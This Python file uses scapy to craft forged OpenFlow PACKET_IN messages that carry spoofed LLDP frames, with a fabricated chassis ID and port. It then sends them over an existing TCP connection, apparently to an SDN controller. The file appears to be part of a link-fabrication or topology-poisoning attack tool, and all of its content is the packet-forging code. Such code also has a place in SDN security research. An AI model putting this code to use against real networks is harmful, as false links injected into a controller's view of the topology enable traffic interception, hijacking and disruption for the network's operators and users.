import time
from scapy.all import *


class Craft_faked:

    def __init__(self, tcp_connection, type, target_addr, src_addr):
        self.connection = tcp_connection
        self.target_addr = target_addr
        self.src_addr = src_addr
        self.type = type
        self.craft()

    def craft(self):
        self.pkt = ""
        if self.type == "LLDP":
            version = "04"
            pkt_in = "0a"
            transaction_id = "00000000"
            buffer_id = "ffffffff"
            reason = "01"
            table_id = "00"
            cookie = "0000776655443322"
            ofpmt_oxm = "0001"
            length_oxm = "000c"
            ofpxmt_ofb_in_port = "8000"
            has_mask = "00"
            length_following = "04"
            value = "00000001"
            padding = "000000000000"
            self.eth = str(Ether(dst=self.target_addr, src=self.src_addr, type=0x88cc))
            chassis = "020704"+"000000"+self.src_addr.replace(':','')[:6]
            port_number = 1
            port = "040502"+binascii.hexlify(struct.pack('>I',port_number))
            ttl = "06020078"
            self.eth += binascii.unhexlify(chassis+port+ttl+"0000")

            payload_length_str = "0000"
            length_str = "0000"
            self.head = binascii.unhexlify(version+pkt_in+length_str+transaction_id+buffer_id+payload_length_str+reason+table_id+cookie+ofpmt_oxm+length_oxm+ofpxmt_ofb_in_port+has_mask+length_following+value+padding)

            print(binascii.hexlify(self.head))
            print(binascii.hexlify(self.eth))

            payload_length = len(self.eth)
            payload_length_str = binascii.hexlify(struct.pack('>H', payload_length))
            length = payload_length+len(self.head)
            length_str = binascii.hexlify(struct.pack('>H', length))
            self.head = binascii.unhexlify(version+pkt_in+length_str+transaction_id+buffer_id+payload_length_str+reason+table_id+cookie+ofpmt_oxm+length_oxm+ofpxmt_ofb_in_port+has_mask+length_following+value+padding)

            print(binascii.hexlify(self.head))
            self.pkt = self.head+self.eth

    def send(self):
        self.connection.send_data_no_previous(self.pkt)
